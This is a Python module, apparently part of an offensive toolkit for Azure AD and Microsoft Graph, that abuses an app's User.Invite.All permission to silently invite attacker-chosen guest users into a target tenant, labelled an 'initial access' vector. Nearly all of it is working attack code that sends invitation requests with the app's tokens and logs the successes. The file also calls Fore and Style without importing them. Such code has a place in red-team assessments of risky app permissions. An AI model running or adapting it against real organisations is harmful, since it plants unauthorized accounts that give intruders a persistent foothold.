from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.userInvite_handler')


class UserInvite_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if True:
            status = False
            attack_name = "UserInviteVectors"
            message = ""
            error = "UserInviteVectors - failed"
            conf = request.attack_config["UserInvite"]

            logger.debug("User.Invite.All - Allows the app to invite guest users to the organization, without a signed-in user..")
            logger.info("Try running User.Invite.All on vector: initial access")
            try:
                for user in conf['users']:
                    create_message_URL = "https://graph.microsoft.com/v1.0/invitations"
                    message_obj = {
                    "invitedUserEmailAddress": user,
                    "inviteRedirectUrl": "https://myapplications.microsoft.com/tenantid=" + request.tenantId,
                    "sendInvitationMessage": "false",
                    "status": "Completed"
                    }
                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    if result.status_code == 201:
                        status = True
                        message += "invited user %s\n" % user
                

                if message == "":
                    message = error

            except:
                logger.error("Unexpected exception in UserInvite_Handler function")

            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))

        return super().handle(request,responses)
    







def UserInvite_Vectors(request_headers, UserInviteSettings, tenantId):
    print()
    print("User.Invite.All - Allows the app to invite guest users to the organization, without a signed-in user..")
    print()
    try:
        print("Attack vector - Initial access.")

        for user in UserInviteSettings['users']:
            create_message_URL = "https://graph.microsoft.com/v1.0/invitations"
            message_obj = {
                "invitedUserEmailAddress": user,
                "inviteRedirectUrl": "https://myapplications.microsoft.com/tenantid=" + tenantId,
                "sendInvitationMessage": "false",
                "status": "Completed"

            }

            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            code = result.status_code
            if code == 201:
                print(Fore.GREEN + "invited user " + user)
                print(Style.RESET_ALL)
            else:
                print("Action did not worked.")
    except:
        pass
